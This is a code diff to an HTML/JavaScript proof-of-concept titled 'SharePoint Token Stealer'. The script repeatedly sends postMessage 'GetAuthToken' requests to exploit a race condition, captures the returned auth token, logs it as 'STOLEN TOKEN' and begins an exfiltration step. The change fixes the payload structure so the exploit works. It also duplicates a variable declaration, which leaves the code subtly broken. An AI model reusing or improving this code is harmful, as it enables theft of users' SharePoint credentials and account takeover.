@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SharePoint PoC V3</title>
+    <title>SharePoint PoC V4</title>
 </head>
 <body>
     <h1>SharePoint Token Stealer</h1>
@@ -41,14 +41,20 @@
 
             // 2. Request Auth Token (Repeated attempts to catch race conditions)
             let attempts = 0;
+            // 2. Request Auth Token (Repeated attempts to catch race conditions)
+            let attempts = 0;
             const interval = setInterval(() => {
                 attempts++;
                 if(attempts > 5) clearInterval(interval);
                 
+                // CRITICAL FIX: The dispatcher passes 'Values' to the handler, 
+                // so parameters must be nested inside 'Values'.
                 const tokenPayload = {
                     MessageId: "GetAuthToken",
-                    AddinTrustId: exploitId,
-                    Resource: window.location.origin 
+                    Values: {
+                        AddinTrustId: exploitId,
+                        Resource: window.location.origin
+                    }
                 };
                 send(tokenPayload);
                 console.log("Sent token request attempt " + attempts);
@@ -58,7 +64,9 @@
         // 3. Capture & Exfiltrate Token
         window.addEventListener("message", (event) => {
             if (event.data && event.data.MessageId === "GetAuthTokenResponse") {
-                const token = event.data.Token;
+                const token = event.data.Values ? event.data.Values.Token : event.data.Token;
+                if (!token) return;
+
                 console.log("STOLEN TOKEN:", token);
                 
                 // EXFILTRATION
